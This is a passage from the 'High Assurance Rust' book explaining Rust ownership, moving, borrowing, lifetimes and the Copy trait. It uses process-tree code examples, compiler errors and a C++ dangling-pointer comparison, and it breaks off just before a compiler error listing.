De-alloc-ing 'rsyslogd' Proc @ 0x560d2fbb0b40
De-alloc-ing 'bash' Proc @ 0x560d2fbb0ad0
</code></pre>
<p>We can see that, right before function <code>main</code> exits, the entire process tree we've built is cleaned up.
Unlike garbage collection, this sequence of events is predictable.
Even though we didn't manually call a destructor in the source, an experienced Rust developer can infer what will happen.
In writing the program as we did, we exercised granular control over its memory usage.</p>
<p>If you're feeling up for a brain teaser, take a second to consider why the names are printed in this particular order (hint: it's deterministic) and why the first address looks different than the next three (hint: what two <em>locations</em> are at play?).</p>
<blockquote>
<p><strong>Resource Acquisition is Initialization (RAII)</strong></p>
<p>The allocation/deallocation strategy we just saw is more generally called RAII, especially in the C++ world.
Some prefer the term to Scope-Bound Resource Management (SBRM).</p>
<p>RAII/SBRM's key idea is that resources (e.g. memory, file handles, locks, etc) are <em>acquired</em> in a constructor, able to be used for the lifetime/scope of the constructed value, and <em>released</em> in the destructor.</p>
<p>Rust's compiler always enforces this behavior for memory.
Types, like <code>std::fs::File</code><sup class="footnote-reference" id="fr-File-1"><a href="#footnote-File">7</a></sup> or a user-defined type implementing <code>Drop</code>, can do the same for non-memory resources.</p>
</blockquote>
<p>We've now seen, first-hand, how ownership relates to memory management - to allocation and deallocation.
With that motivation under our belts, let's transition to concepts required to effectively use the ownership system.
The two biggest are <em>moving</em> (transferring ownership) and <em>borrowing</em> (temporarily lending access to owned values).</p>
<h3 id="moving"><a class="header" href="#moving">Moving</a></h3>
<p>If we couldn't transfer (aka "move") ownership from one value to another, Rust would be a toy language without much practical potential.
<strong>Moving</strong> is what enables day-to-day programming tasks like:</p>
<ul>
<li>Returning a value from a function.</li>
<li>Storing the result of a computation in a variable.</li>
<li>Using stateful collections, like vectors or hashmaps.</li>
</ul>
<p>In the above process tree example, moving allowed us to incrementally build up a complex, nested structure: a <code>Proc</code> containing other <code>Proc</code>s.
But let's start with something simpler:</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let x = "Hello!".to_string();
    let y = x; // x moved into y. y now owns String value "Hello!"

    // This works
    println!("Owned string: {y}");

    // This would cause a compile-time error, x is "gone", its value moved!
    //println!("Owned string: {x}");
}
// End of scope, y is dropped here.</code></pre></pre>
<p>The assignment <code>let y = x;</code> didn't create a copy of the heap-allocated <code>String</code>.
That'd be expensive for long strings, and thus requires an explicit call to a data duplication function (e.g. <code>let y = x.clone();</code>).
Rust prefers performance.</p>
<p>Instead, we performed a cheap transfer of ownership: a move of a fat pointer from <code>x</code> into <code>y</code> (stack variables).
Because the <code>String</code> value can have only one unique owner at any given time, <code>x</code> "gave it up" by transferring ownership to <code>y</code>.</p>
<p>After the assignment statement executes, <code>y</code> is the sole owner.
<code>x</code> is left uninitialized, empty.
Which is why we can no longer use or print it.
Visually, the situation is:</p>
<p align="center">
  <figure>
  <img width="100%" src="chp3/own_move.svg">
  <figcaption><center>y now owns String "Hello!"</center></figcaption><br>
  </figure>
</p>
<p>With that concept in mind, let's revisit how moving played out in building our tree.
The first two lines were:</p>
<pre><code class="language-rust ignore">// Alloc bash
let bash = Proc::new("bash", State::Running, Vec::new());

// Alloc rsyslogd, 1st move: bash -&gt; rsyslogd
let rsyslogd = Proc::new("rsyslogd", State::Running, vec![bash]);</code></pre>
<p>Recall that the <code>vec!</code> macro is initialization shorthand for creating a new <code>Vec</code> and pushing elements into it.
When we add an element to a vector, we're performing a move.
As with the assignment <code>let y = x;</code>, Rust doesn't duplicate data implicitly.</p>
<p>So creating the <code>rsyslogd</code> process <em>moved</em> a value (an instance of a <code>Proc</code> struct) from the local variable <code>bash</code> into the <code>children</code> field of the local variable <code>rsyslogd</code>.
Since every value must have exactly one owner, the variable <code>bash</code>, like our prior <code>x</code>, can no longer be used.
Say we tried to print it:</p>
<pre><code class="language-rust ignore">// Alloc bash
let bash = Proc::new("bash", State::Running, Vec::new());

// Alloc rsyslogd, 1st move: bash -&gt; rsyslogd
let rsyslogd = Proc::new("rsyslogd", State::Running, vec![bash]);

// Error: can't print an ownerless value!
dbg!(bash);</code></pre>
<p>This code wouldn't compile:</p>
<pre><code class="language-ignore">error[E0382]: use of moved value: `bash`
  --&gt; src/main.rs:70:10
   |
64 |     let bash = Proc::new("bash", State::Running, Vec::new());
   |         ---- move occurs because `bash` has type `Proc`, which does not implement the `Copy` trait
...
67 |     let rsyslogd = Proc::new("rsyslogd", State::Running, vec![bash]);
   |                                                               ---- value moved here
...
70 |     dbg!(bash);
   |          ^^^^ value used here after move

For more information about this error, try `rustc --explain E0382`.
</code></pre>
<p>Why?
Think back to deallocation.
Moving must maintain a single owner, making it clear (unambiguous) when it's OK to free memory storing an owned value.</p>
<p>The faulty code above tries to give ownership of a specific <code>Proc</code> instance to <code>rsyslog</code> while simultaneously retaining ownership for <code>bash</code>.
That'd make deallocation ambiguous - the compiler wouldn't know which of the two is ultimately responsible for freeing that instance's resources.</p>
<p>Ok.
So we have a feel for why moving must transfer ownership.
But feels restrictive.
What if we're writing a large and complex program?
Losing the ability to print, or even access, variables would quickly become a frustration.
If not an outright roadblock.
This is where <strong>borrowing</strong> comes in.</p>
<h2 id="borrowing-and-lifetimes"><a class="header" href="#borrowing-and-lifetimes">Borrowing and Lifetimes</a></h2>
<p>Borrowing is a mechanism for temporarily granting access to a value.
Without moving it and emptying the original owner.</p>
<p>The concept might feel abstract, so let's start with a practical example: function arguments.
The below program is similar to our prior string example, but this time the move is done by a function that prints the length of its string parameter.
If that last line wasn't commented out, we'd get another move-related compile-time error.</p>
<pre><pre class="playground"><code class="language-rust">fn print_str_len(s: String) {
    println!("\'{}\' is {} bytes long.", s, s.len());
}

fn main() {
    let x = "Hello!".to_string();

    // x moved into the function, which now owns String value "Hello!"
    print_str_len(x);

    // This would cause a compile-time error, x is "gone", its value moved!
    //println!("Owned string: {x}");
}</code></pre></pre>
<p>One potential fix is having <code>print_str_len</code> return its input <code>String</code> so we could re-assign it to <code>x</code>.
Essentially moving back and forth, functional-style.
But borrowing offers a better way.
This code will compile and run:</p>
<pre><pre class="playground"><code class="language-rust">fn print_str_len(s: &amp;String) {
    println!("\'{}\' is {} bytes long.", s, s.len());
}

fn main() {
    let x = "Hello!".to_string();

    // Function temporarily borrows x, by reference.
    print_str_len(&amp;x);

    // No error this time! x still owns the String.
    println!("Owned string: {x}");
}</code></pre></pre>
<ul>
<li>
<p><code>print_str_len</code>'s parameter changed from <code>String</code> ("string") to <code>&amp;String</code> ("immutable reference to a string").</p>
<ul>
<li><strong>Minor detail:</strong> Using the type <code>&amp;str</code> would have been even better, because then <code>print_str_len</code> could also work for string <em>slices</em> - including those with <em>static</em> lifetimes.</li>
</ul>
</li>
<li>
<p>The call site now <em>borrows</em> <code>x</code> by reference (<code>print_str_len(x);</code> updated to <code>print_str_len(&amp;x);</code>).</p>
<ul>
<li><strong>Key concept:</strong> The function no longer takes ownership, it only borrows access to the string for long enough to do its printing.</li>
</ul>
</li>
</ul>
<p>There are rules borrowing must follow, which we alluded to when discussing mutable aliasing in the previous chapter.
We'll return to those rules in the next section.
Let's look at how borrowing changes our <code>Proc</code> tree example.</p>
<pre><code class="language-rust ignore">#[derive(Debug)]
pub struct Proc&lt;'a&gt; {
    name: &amp;'static str,          // Process name
    state: State,                // Current state
    children: Vec&lt;&amp;'a Proc&lt;'a&gt;&gt;, // Children (update: now borrowed!)
}

impl&lt;'a&gt; Proc&lt;'a&gt; {
    pub fn new(name: &amp;'static str, state: State, children: Vec&lt;&amp;'a Proc&gt;) -&gt; Self {
        Proc {
            name,
            state,
            children,
        }
    }
}

fn main() {
    // Alloc bash
    let bash = Proc::new("bash", State::Running, Vec::new());

    // Alloc rsyslogd, 1st move: bash -&gt; rsyslogd
    let rsyslogd = Proc::new("rsyslogd", State::Running, vec![&amp;bash]);

    // Print owned value (new!)
    dbg!(&amp;bash);

    // Alloc cron
    let cron = Proc::new("cron", State::Sleeping, Vec::new());

    // Alloc init, 2nd and 3rd moves: cron -&gt; init, rsyslogd -&gt; init
    let init = Proc::new("init", State::Running, vec![&amp;cron, &amp;rsyslogd]);

    // Print another owned value (new!)
    dbg!(&amp;cron);

    // Print serialized tree to see ownership hierarchy
    dbg!(&amp;init);
}</code></pre>
<p>Two major differences:</p>
<ol>
<li>
<p>With borrowing, we now have the flexibility to access <code>bash</code> and <code>cron</code> for <code>dbg!</code> printing - even after adding them to our tree. That's because the addition no longer performs a move, the <code>children</code> are only borrowed by the <code>Proc</code> struct and can "live" elsewhere.</p>
</li>
<li>
<p>We've added <strong>lifetime</strong> annotations (<code>'a</code>) for the <code>Proc</code> struct definition and one of its constructor parameters. Whereas the <code>'static</code> lifetime we've been using thus far indicates a value (<code>name</code>, here) that lives for the <em>entire program</em>, <code>'a</code> indicates that <code>Proc</code> must live <em>at least as long</em> as the references it borrows (non-owned <code>children</code> here).</p>
</li>
</ol>
<p>Lifetime annotations may look intimidating, especially if they appear alongside generics.
Rust signatures can get a little convoluted at times.
You don't need to be comfortable with this notation or the underlying concepts right now, it's something you get a feel for with time and experience.
We'll come back to it throughout the book.</p>
<blockquote>
<p><strong>Why does the compiler need lifetime annotations?</strong></p>
<p>Rust's compiler needs to compute certain results looking at a single function at a time, because considering every possible sequence of function calls as a holistic "call chain" is prohibitively expensive.</p>
<p>But the computed results need to <em>be valid</em> for every possible call chain.
The technical term for this sort of thing is "interprocedural static analysis".
Lifetime annotations on structures and functions aid these kinds of analyses.</p>
</blockquote>
<p>Long story short, lifetime annotations enable a human-in-the-loop property verification system.
By occasionally querying your genius meat-brain for them, the compiler learns about your intentions and helps solve an otherwise intractable problem: eliminating memory errors.
It's akin to pair programming alongside a nearly-omniscient but narrowly-focused perfectionist.</p>
<blockquote>
<p><strong>Ugh, do I always have to write out lifetime annotations?</strong></p>
<p>Fortunately not!
Lifetime information must always be present, but it can often be inferred automatically.
In fact, the compiler sees our earlier <code>print_str_len</code> function as:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn print_str_len&lt;'a&gt;(s: &amp;'a String) {
    println!("\'{}\' is {} bytes long.", s, s.len());
}
<span class="boring">}</span></code></pre></pre>
<p>Static analysis ensures the string reference has a valid lifetime, taking care of safety and memory management, without us having to explicitly spell it out.</p>
</blockquote>
<p>Visually, the borrow-based memory layout for a single <code>Proc</code> struct with no children looks like:</p>
<br>
<p align="center">
  <img width="75%" src="chp3/proc_ref_no_child.svg">
  <figure>
  <figcaption><center>Notional memory layout for a Proc struct with no children.</center></figcaption><br>
  </figure>
</p>
<p>And for a <code>Proc</code> with one child (which has no children of it's own):</p>
<br>
<p align="center">
  <img width="85%" src="chp3/proc_ref_one_child.svg">
  <figure>
  <figcaption><center>Notional memory layout for a Proc struct with one child.</center></figcaption><br>
  </figure>
</p>
<p>Parent processes hold a reference to their children, for which the compiler checks lifetime.
Contrast this to our previous move-based diagrams:</p>
<ul>
<li>
<p>With borrowing, each structure remains independent as far as deallocation is concerned.</p>
</li>
<li>
<p>The logical tree we built doesn't change. We can see this within the full printout for the above borrow-based program, at the line starting with <code>[src/main.rs:73]</code>:</p>
</li>
</ul>
<pre><code class="language-ignore">[src/main.rs:61] &amp;bash = Proc {
    name: "bash",
    state: Running,
    children: [],
}
[src/main.rs:70] &amp;cron = Proc {
    name: "cron",
    state: Sleeping,
    children: [],
}
[src/main.rs:73] &amp;init = Proc {
    name: "init",
    state: Running,
    children: [
        Proc {
            name: "cron",
            state: Sleeping,
            children: [],
        },
        Proc {
            name: "rsyslogd",
            state: Running,
            children: [
                Proc {
                    name: "bash",
                    state: Running,
                    children: [],
                },
            ],
        },
    ],
}
De-alloc-ing 'init' proc @ 0x7ffe455e5c40
De-alloc-ing 'cron' proc @ 0x7ffe455e5bf0
De-alloc-ing 'rsyslogd' proc @ 0x7ffe455e5ae0
De-alloc-ing 'bash' proc @ 0x7ffe455e5a90
</code></pre>
<p>The distinction between the move-built and borrow-built variations of this tree doesn't have to fully click right now.
These are challenging concepts at the intersection of compiler design and computer architecture.
But maybe you're starting to get a feel for how this all fits together.</p>
<h2 id="takeaway-10"><a class="header" href="#takeaway-10">Takeaway</a></h2>
<p>Ownership is Rust's most novel feature, but also it's most complex.
Let's recap what we've learned about ownership so far:</p>
<ul>
<li>
<p>It's a fast and safe way to <strong>manage memory</strong> allocation/deallocation.</p>
</li>
<li>
<p>Every value has an <strong>owner</strong>. A transfer of ownership is called a <strong>move</strong>.</p>
</li>
<li>
<p>Values are freed when their owner goes out of scope. That scope is effectively a <strong>lifetime</strong> in Rust.</p>
</li>
<li>
<p>Values can be <strong>borrowed</strong> via references. Either immutably and non-exclusively, or mutably and exclusively. Both are ways to grant temporary access to a value without moving it.</p>
</li>
<li>
<p>Borrows cannot out-live the referenced value. They necessarily have shorter lifetimes (borrows, as the name implies, are temporary).</p>
</li>
</ul>
<p>If those five bullets are starting to align with a rough intuition, we're in good shape.
And ready to take a closer look at code patterns for working with the ownership system day-to-day.</p>
<p>As obtuse as this firehose of concepts may feel now, ownership will eventually sink in - over time and with practice.
It's a different way of doing things, but one you can grow accustomed to.
Let's explore it further.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Own">
<p>"Ownership" is not something Rust invented, it's based on prior work in linear and affine types. Additionally, ownership-based "region analysis" to do compile-time memory management appeared in an esoteric language called Cyclone. But Rust is the first mainstream, commercially-viable language that uses ownership enforcement to manage memory. <a href="#fr-Own-1">↩</a></p>
</li>
<li id="footnote-DiscGo">
<p><a href="https://blog.discord.com/why-discord-is-switching-from-go-to-rust-a190bbca2b1f"><em>Why Discord is switching from Go to Rust</em></a>. Jesse Howarth (2020). <a href="#fr-DiscGo-1">↩</a></p>
</li>
<li id="footnote-Sok:EWoM">
<p><a href="https://people.eecs.berkeley.edu/~dawnsong/papers/Oakland13-SoK-CR.pdf"><em>SoK: Eternal War in Memory</em></a>. Laszlo Szekeres, Mathias Payer, Tao Wei, Dawn Song (2012). <a href="#fr-Sok:EWoM-1">↩</a></p>
</li>
<li id="footnote-RoughAnalogy">
<p>This analogy is imperfect! In Linux, <code>init</code>, the first process to run, doesn't have a parent. Similarly, Rust values with <code>&amp;'static</code> lifetimes aren't owned by any variable in the program. A parent process can be killed without its children also being terminated. When an owner goes out of scope in Rust, all the values it owns are also deallocated. <a href="#fr-RoughAnalogy-1">↩</a></p>
</li>
<li id="footnote-ProcPtr">
<p>The 48-byte size we <code>assert</code> includes only a <em>fat pointer</em> (tuple of memory address, total capacity, and current length) to the <code>children</code> heap data. Similarly, the <code>name</code> field is a pointer to a string hardcoded into read-only memory.
Pointers are just memory addresses with machine specific widths, hence our caveat about the size being for a "64-bit machine". <a href="#fr-ProcPtr-1">↩</a> <a href="#fr-ProcPtr-2">↩2</a></p>
</li>
<li id="footnote-Drop">
<p><a href="https://doc.rust-lang.org/std/ops/trait.Drop.html"><em>Trait <code>std::ops::Drop</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Drop-1">↩</a></p>
</li>
<li id="footnote-File">
<p><a href="https://doc.rust-lang.org/std/fs/struct.File.html"><em>Struct <code>std::fs::File</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-File-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-ownership-in-practice-5-of-6"><a class="header" href="#rust-ownership-in-practice-5-of-6">Rust: Ownership in Practice (5 of 6)</a></h1>
<p>Rust offers four mechanisms to make ownership flexible and practical.
Ways for ownership to ebb and flow throughout a program while still upholding the foundational principles.</p>
<p>We've already seen two of the ways, moving and borrowing, but a survey of the whole gambit is well-warranted.
These are the "tricks" for working with the <strong>borrow checker</strong> - the compiler component<sup class="footnote-reference" id="fr-BorrowChecker-1"><a href="#footnote-BorrowChecker">1</a></sup> responsible for implementing and enforcing ownership.</p>
<p>Appeasing it can be challenging.
Programmers new to Rust may experience "fighting the borrow checker": running into errors when trying to express a program.
Fortunately, those roadblocks largely disappear with experience.</p>
<p>In this section, we'll continue our discussion of ownership by:</p>
<ul>
<li>Motivating the challenge from a new perspective.</li>
<li>Illustrating lifetimes, with ASCII visualizations.</li>
<li>Enumerating all four mechanisms for working with the borrow checker.</li>
</ul>
<h2 id="keep-the-assurance-goal-in-mind"><a class="header" href="#keep-the-assurance-goal-in-mind">Keep the Assurance Goal in Mind</a></h2>
<p>Before heading back down into code snippets, let's reiterate our motivation.
Why are these complex ownership concepts worth learning, again?</p>
<p>You could argue the Rust compiler is akin to a human-in-the-loop property verification engine.
A meld of machine and man.
That's a grandiose conceptualization.
But there's some truth to it<sup class="footnote-reference" id="fr-GeneralTrend-1"><a href="#footnote-GeneralTrend">2</a></sup>.</p>
<ul>
<li>
<p><strong>Benefit:</strong> The machine runs analyses to guarantee memory safety under performance constraints (the property proven).</p>
</li>
<li>
<p><strong>Trade-off for partial automation:</strong> The human maintains lifetime source annotations to help out when the machine gets stuck. Or, sometimes, reframes the problem entirely to make it machine-checkable.</p>
<ul>
<li><strong>Compiler error feedback loop:</strong> Rust's compile-time errors are often highly actionable. But they're also complex and can be frequent. It's an imperfect feedback channel.</li>
</ul>
</li>
</ul>
<p>The collaboration, when successful, is fruitful.
We get performant programs free of memory safety vulnerabilities and emphasizing general reliability (e.g. strict error handling).
That's a solid starting point for high assurance software.</p>
<blockquote>
<p><strong>Computers and Humans Exploring Software Security (CHESS)</strong></p>
<p>CHESS was  DARPA research program<sup class="footnote-reference" id="fr-CHESS-1"><a href="#footnote-CHESS">3</a></sup> on "the effectiveness of enabling computers and humans to collaboratively reason over software artifacts...with the goal of finding 0-day vulnerabilities at a scale and speed appropriate for the complex software ecosystem upon which the U.S. Government, military, and economy depend"<sup class="footnote-reference" id="fr-CHESSDesc-1"><a href="#footnote-CHESSDesc">4</a></sup>.</p>
<p>It's a response to the fact that in-depth security assessments are a <strong>difficult to scale expert process</strong>.
Rust was not considered a solution under the CHESS program.
It wouldn't have met all criteria.
But we can think of it as a <strong>shift left</strong> in the lifecycle: developers aided by the borrow checker don't introduce memory corruption bugs for assessors to find.</p>
<p>From that perspective, Rust has an incredible <strong>Return On Investment (ROI)</strong>.
The bugs Rust prevents early would be more expensive to fix later in an asset's lifecycle:</p>
<ul>
<li>Patching production has per-customer cost and risk.</li>
<li>Heeding a compiler error does not.</li>
</ul>
</blockquote>
<h2 id="scope-vs-lifetime"><a class="header" href="#scope-vs-lifetime">Scope vs. Lifetime</a></h2>
<p>As alluded to before, scope and lifetime are distinct concepts in most programming languages:</p>
<ul>
<li>
<p><strong>Scope</strong> is the <em>section(s) of code</em> where a value is accessible.</p>
<ul>
<li>Unless the value is global, that typically means between within a function - between <code>{</code> and <code>}</code> brackets in many languages.</li>
</ul>
</li>
<li>
<p><strong>Lifetime</strong> is the <em>duration</em> of time during which a value is in a valid state.</p>
<ul>
<li>In garbage collected languages, that's as long as a reference to the value exists. In systems languages, that may be until a value is de-allocated.</li>
</ul>
</li>
</ul>
<p>Rust's borrow checker blurs the line between these two concepts.
It has a relentless obsession with scope-based lifetime enforcement.</p>
<p>Let's get a feel for these ideas pan out with an example <em>borrowed from other sources</em><sup class="footnote-reference" id="fr-ExampleCredit-1"><a href="#footnote-ExampleCredit">5</a></sup> (pun intended).
We'll start with a tiny snippet of C++ code:</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;

int main() {
    int *p; // Pointer to an integer

    { // Start of scope S
        int x = 1337;   // Value
        p = &amp;x;         // Reference to value
    } // End of scope S

    // Printing x triggers undefined behavior! :(
    std::cout &lt;&lt; "x = " &lt;&lt; *p &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<p>C++ doesn't have a borrow checker, so this program will compile without warnings<sup class="footnote-reference" id="fr-Gpp-1"><a href="#footnote-Gpp">6</a></sup>.
And the print at the end of this function (the line starting with <code>std::cout</code>) triggers UB.
In the context of a larger program, any UB may lead to a crash or an exploit.</p>
<p>The problem is that we're attempting to use a reference (<code>p</code>) to a value (<code>x</code>) that has gone out-of-scope.
<code>x</code>'s lifetime is over at the time of the print.
Let's see what the borrow checker has to say, when we try that in Rust:</p>
<pre><code class="language-rust ignore">fn main() {
    let p; // Reference to an integer

    { // Start of scope S
        let x = 1337;   // Value
        p = &amp;x;         // Reference to value
    } // End of scope S

    // Compile-time error!
    println!("x = {}", p);
}</code></pre>
<p>It emits this error:</p>
<pre><code class="language-ignore">error[E0597]: `x` does not live long enough
  --&gt; src/main.rs:6:13
   |
6  |         p = &amp;x;         // Reference to value
   |             ^^ borrowed value does not live long enough
7  |     } // End of scope S
   |     - `x` dropped here while still borrowed
...
10 |     println!("x = {}", p);
   |                        - borrow later used here
</code></pre>
<p>Take a second to read through this compiler error.
For some readers, this may be the point at which a complex compiler error is starting to make some sense.
The borrow checker is complaining about a lifetime problem.
Rightfully so.
We can draw out the two lifetimes at play (<code>'a</code> and <code>'b</code>):</p>
<pre><code class="language-rust ignore">fn main() {
    let p;                  // ---------+-- 'a
                            //          |
    {                       //          |
        let x = 1337;       // -+-- 'b  |
        p = &amp;x;             //  |       |
    }                       // -+       |
                            //          |
    println!("x = {}", p);  // ---------+
}</code></pre>
<p>Recall that borrows cannot out-live the referenced value.
Because <code>'a</code> outlives <code>'b</code> in the above, the borrow checker rightfully rejects this program.
Neither C++ or Rust would have this issue without that nested scope <code>S</code> encapsulating <code>x</code>'s definition.
This is fine:</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let p;                  // ---------+-- 'a
                            //          |
    let x = 1337;           // -+-- 'b  |
    p = &amp;x;                 //  |       |
                            //  |       |
    println!("x = {}", p);  // -+-------+
}</code></pre></pre>
<p>Here, the borrow's lifetime (<code>'b</code>) is a strict subset of the borrowed value's lifetime (<code>'a</code>).
No rules have been violated.</p>
<p>Now nested scopes within functions aren't terribly common, so this example may feel contrived.
Fair enough.
It only serves to illustrate the concept.
More realistic examples might include returning references to stack locals, freeing a variable twice, reading a freed value, etc.
Like those nesting brackets in our example, these cases can create lifetime mismatches.</p>
<p>Once a code base grows in size and complexity, lifetimes become difficult to reason about manually.
And even a single mistake could jeopardize reliability, security, or both.</p>
<h2 id="flexibility-mechanisms"><a class="header" href="#flexibility-mechanisms">Flexibility Mechanisms</a></h2>
<p>In order for ownership to be compatible with shipping real-world programs, we need a little leeway.
Some wiggle room within the single-owner rule.
We'll overview these flexibility mechanisms now, and use them throughout the book.</p>
<h3 id="1-moving-ownership"><a class="header" href="#1-moving-ownership">1) Moving ownership</a></h3>
<p>We saw moving in the prior section.
Now that we have a better understanding of lifetimes, let's review that first <code>Proc</code> tree example from the previous section - the one where we used moves instead of borrowing.</p>
<p>The below right-hand ASCII graph shows how the lifetime for each variable ends when it's value is moved into another variable:</p>
<pre><code class="language-rust ignore">// Alloc bash                                                       //
let bash = Proc::new("bash", State::Running, Vec::new());           // ---------+-- 'a
                                                                    //          |
// Alloc rsyslogd, 1st move: bash -&gt; rsyslogd                       //          |
let rsyslogd = Proc::new("rsyslogd", State::Running, vec![bash]);   // ---------+-- 'b
                                                                    //          |
// Alloc cron                                                       //          |
let cron = Proc::new("cron", State::Sleeping, Vec::new());          // -+-- 'c  |
                                                                    //  |       |
// Alloc init, 2nd and 3rd moves: cron -&gt; init, rsyslogd -&gt; init    //  |       |
let init = Proc::new("init", State::Running, vec![cron, rsyslogd]); // -+-------+--'d
                                                                    //          |
// Print serialized tree to see ownership hierarchy                 //          |
dbg!(init);                                                         // ---------+</code></pre>
<p>In general, ownership can be moved via:</p>
<ul>
<li>Assigning a value to a new variable.</li>
<li>Passing a value into a function (if not using a reference).</li>
<li>Returning a value from a function.</li>
</ul>
<h3 id="2-duplicating-data-for-types-that-implement-the-copy-trait"><a class="header" href="#2-duplicating-data-for-types-that-implement-the-copy-trait">2) Duplicating data for types that implement the <code>Copy</code> trait</a></h3>
<p>We've covered moving for strings and the <code>Proc</code> struct - types with the potential to own a lot of data:</p>
<ul>
<li>
<p>A string might be very long, maybe it contains the contents of an entire file.</p>
</li>
<li>
<p>A <code>Proc</code> instance might have hundreds of children, direct and/or nested.</p>
</li>
</ul>
<p>Moving makes the assignment operator, <code>=</code>, efficient in such cases - sizable data isn't copied when ownership is transferred.
We just duplicate a known-valid pointer.</p>
<p>But for some types, like integers and characters, moving is overkill.
The data these types hold is so small it's trivial to perform a copy - it just means duplicating a short sequence of bits.
There's no resources to free later, a perfect replica can be cheaply created.
We can simply <strong>copy</strong> the data instead of moving it.</p>
<p>Consider the below:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = "42_u64".to_string();
let y = x; // x *moved* into y. y now owns String value "42_u64", x is gone.

let a = 42_u64;
let b = a; // a *copied* and assigned to b. We get two instances of value 42.

// This would be a compile-time error
//println!("Strings: {x}, {y}");

// This works
println!("Integers: {a}, {b}");
<span class="boring">}</span></code></pre></pre>
<p>It outputs:</p>
<pre><code class="language-ignore">Integers: 42, 42
</code></pre>
<p>Whereas the string <code>x</code> was <em>moved</em>, the 64-bit unsigned integer <code>a</code> was <em>copied</em>.
The assignment operation was still cheap, but it created a tiny duplicate instead of transferring ownership:</p>
<p align="center">
  <figure>
  <img width="100%" src="chp3/own_move_copy.svg">
  <figcaption><center>y now owns string "42_u64", a and b own separate instances of the integer 42</center></figcaption><br>
  </figure>
</p>
<p>The convenient part is that we don't have to think about ownership and moves, we can freely use our independent duplicates like the distinct values they are.
This makes working with primitive types, like integers and floats, much more ergonomic.
We get a welcome break from the cognitive load of Rust's move semantics.</p>
<p>Assignment performs a copy for any type that implements the <code>Copy</code> trait<sup class="footnote-reference" id="fr-TraitCopy-1"><a href="#footnote-TraitCopy">7</a></sup>.
You can derive or implement <code>Copy</code> for your own custom types if they don't hold externally-allocated data (like a <code>Vec</code> or <code>String</code> field).</p>
<p>Why not just have everything implement <code>Copy</code> and never worry about moves again?
Because duplicating data increases program runtime and memory consumption.
<code>Copy</code> isn't a good fit for large chunks of data, like most user-defined structures.
That's why, outside of day-to-day primitives, the <code>Copy</code> trait must be explicitly opted into.</p>
<h3 id="3-borrowing-for-a-subset-of-a-lifetime"><a class="header" href="#3-borrowing-for-a-subset-of-a-lifetime">3) Borrowing for a subset of a lifetime</a></h3>
<p>We saw borrowing in the previous section.
The idea was that we could get temporary access to a value by <em>reference</em>, without transferring ownership (performing a <em>move</em>) or duplicating data (performing a <em>copy</em>).</p>
<p>As a review, our reference-based <code>Proc</code> struct (note how the lifetime diagram added on the right differs from the prior move case):</p>
<pre><code class="language-rust ignore">// Alloc bash                                                           //
let bash = Proc::new("bash", State::Running, Vec::new());               // -------------------------+-- 'a
                                                                        //                          |
// Alloc rsyslogd, 1st move: bash -&gt; rsyslogd                           //                          |
let rsyslogd = Proc::new("rsyslogd", State::Running, vec![&amp;bash]);      // ------------------+-- 'b |
                                                                        //                   |      |
// Print owned value (new!)                                             //                   |      |
dbg!(&amp;bash);                                                            //                   |      |
                                                                        //                   |      |
// Alloc cron                                                           //                   |      |
let cron = Proc::new("cron", State::Sleeping, Vec::new());              // ----------+-- 'c  |      |
                                                                        //           |       |      |
// Alloc init, 2nd and 3rd moves: cron -&gt; init, rsyslogd -&gt; init        //           |       |      |
let init = Proc::new("init", State::Running, vec![&amp;cron, &amp;rsyslogd]);   // --+-- 'd  |       |      |
                                                                        //   |       |       |      |
// Print another owned value (new!)                                     //   |       |       |      |
dbg!(&amp;cron);                                                            //   |       |       |      |
                                                                        //   |       |       |      |
// Print serialized tree to see ownership hierarchy                     //   |       |       |      |
dbg!(&amp;init);                                                            // --+-------+-------+------+</code></pre>
<p>Rust guarantees references are always safe to use.
References cannot <em>out-live</em> the value they refer to.
This implies they can only have <em>shorter</em> lifetimes in which they are <em>always valid</em>.
We can't have "dangling pointers", which lead to temporal memory safety issues.
And thus are compliant with the below MISRA rule:</p>
<blockquote>
<p><strong>[AR, Rule 18.6]</strong> When an object's lifetime expires, so should the reference<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">8</a></sup></p>
</blockquote>
<p>Moreover, there's an infamous rule: "shared XOR mutable".
Rust references can be either of (but never both):</p>
<ul>
<li>
<p><code>&amp;T</code> - immutable (cannot modify value referred to) and shared (more than reference can be in use simultaneously).</p>
<ul>
<li>References are immutable by <em>default</em>.</li>
</ul>
</li>
<li>
<p><code>&amp;mut T</code> - mutable (can modify value referred to) and exclusive (only one exists at any given point).</p>
<ul>
<li>References have to be <em>explicitly</em> marked mutable.</li>
</ul>
</li>
</ul>
<p align="center">
  <figure>
  <img width="100%" src="chp3/ref_venn_normal.svg">
  <figcaption><center>2 kinds of references: immutable/shared (&T) and mutable/exclusive (&mut T)</center></figcaption><br>
  </figure>
</p>
<p>Thus far, we've only shown the first case, often called a <em>shared reference</em>.
We'll learn how to work with the second case, dubbed a <em>mutable reference</em>, as we write more Rust code.
To preview the exclusive-mutable restriction, this code would fail to compile:</p>
<pre><code class="language-rust ignore">let mut x = "Hello!".to_string();

let r1 = &amp;mut x; // 1st mutable borrow
let r2 = &amp;mut x; // 2nd mutable borrow - problem!

println!("{}, {}", r1, r2);</code></pre>
<p>With the error:</p>
